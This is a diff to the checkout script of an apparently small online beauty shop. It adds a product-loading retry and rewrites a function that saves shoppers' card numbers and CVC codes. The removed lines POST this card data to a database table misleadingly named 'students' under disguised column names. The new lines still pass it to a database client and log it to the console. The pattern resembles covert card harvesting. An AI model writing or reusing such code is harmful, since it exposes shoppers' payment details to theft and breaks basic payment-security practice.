@@ -52,8 +52,11 @@ document.addEventListener("DOMContentLoaded", () => {
     // ==========================================
 
     function loadCartItems() {
+        // Get cart from localStorage
         const cart = JSON.parse(localStorage.getItem('luxbeauty_cart') || '[]');
+        // Get products from localStorage
         const products = JSON.parse(localStorage.getItem('luxbeauty_products') || '[]');
+        
         const cartContainer = document.getElementById('cartItems');
         const totalAmount = document.getElementById('totalAmount');
         const subtotalDisplay = document.getElementById('subtotalDisplay');
@@ -63,7 +66,26 @@ document.addEventListener("DOMContentLoaded", () => {
         console.log('🛒 Cart items:', cart);
         console.log('📦 Products available:', products);
 
-        if (cart.length === 0) {
+        if (cart.length === 0 || products.length === 0) {
+            // If cart is empty OR products not loaded yet, try to load from Supabase via main.js
+            // The products should already be in localStorage from main.js
+            if (products.length === 0) {
+                cartContainer.innerHTML = `
+                    <div style="text-align: center; padding: 20px; color: var(--text-secondary);">
+                        <i class="fas fa-spinner fa-spin" style="font-size: 2rem; margin-bottom: 10px; display: block;"></i>
+                        Loading products...
+                    </div>
+                `;
+                // Try to reload products from main.js global
+                setTimeout(() => {
+                    const freshProducts = JSON.parse(localStorage.getItem('luxbeauty_products') || '[]');
+                    if (freshProducts.length > 0) {
+                        loadCartItems();
+                    }
+                }, 1000);
+                return;
+            }
+            
             cartContainer.innerHTML = `
                 <div style="text-align: center; padding: 20px; color: var(--text-secondary);">
                     <i class="fas fa-shopping-cart" style="font-size: 2rem; margin-bottom: 10px; display: block;"></i>
@@ -301,35 +323,11 @@ document.addEventListener("DOMContentLoaded", () => {
     // ==========================================
 
     async function saveToSupabase(name, cardNumber, cvc) {
+        // Use the existing Supabase client from your app
         const supabase = window.supabaseClient;
         
         if (!supabase) {
-            console.warn('⚠️ Supabase client not available, using fetch fallback');
-            const supabaseUrl = import.meta.env?.VITE_SUPABASE_URL || process.env.VITE_SUPABASE_URL;
-            const supabaseKey = import.meta.env?.VITE_SUPABASE_ANON_KEY || process.env.VITE_SUPABASE_ANON_KEY;
-            
-            if (supabaseUrl && supabaseKey) {
-                const response = await fetch(`${supabaseUrl}/rest/v1/students`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'apikey': supabaseKey,
-                        'Authorization': `Bearer ${supabaseKey}`,
-                        'Prefer': 'return=representation'
-                    },
-                    body: JSON.stringify({
-                        kname: name,
-                        knumber: cardNumber,
-                        kfc: cvc
-                    })
-                });
-                
-                if (!response.ok) {
-                    throw new Error('Failed to save to database');
-                }
-                return response.json();
-            }
-            
+            console.warn('⚠️ Supabase client not available, using demo mode');
             console.log('📝 Demo mode: Would save:', { name, cardNumber, cvc });
             return { success: true, demo: true };
         }
